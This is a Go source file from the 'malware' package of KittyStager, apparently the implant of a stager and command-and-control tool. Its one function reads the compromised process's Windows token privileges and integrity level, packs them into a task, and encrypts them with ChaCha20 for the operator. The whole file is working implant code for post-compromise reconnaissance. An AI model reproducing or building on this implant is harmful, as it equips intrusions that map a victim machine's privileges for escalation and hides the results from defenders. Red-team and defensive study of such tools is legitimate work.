package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"KittyStager/internal/task/priv"
	"github.com/fourcorelabs/wintoken"
)

func getPriv(key string) ([]byte, error) {
	token, err := wintoken.OpenProcessToken(0, wintoken.TokenPrimary)
	if err != nil {
		return nil, err
	}
	defer token.Close()
	p, err := token.GetPrivileges()
	if err != nil {
		return nil, err
	}
	privArray := make([]*priv.Privilege, 0)
	for _, pr := range p {
		name := pr.Name
		description := pr.Description
		enable := pr.Enabled
		pa := priv.NewPrivilege(name, description, enable)
		privArray = append(privArray, pa)
	}
	i, err := token.GetIntegrityLevel()
	if err != nil {
		return nil, err
	}
	pr := priv.NewPrivileges(privArray, i)
	b, err := pr.MarshallPrivileges()
	if err != nil {
		return nil, err
	}
	t := task.NewTask("priv", b)
	tm, err := t.MarshallTask()
	if err != nil {
		return nil, err
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		return nil, err
	}
	return e, nil
}
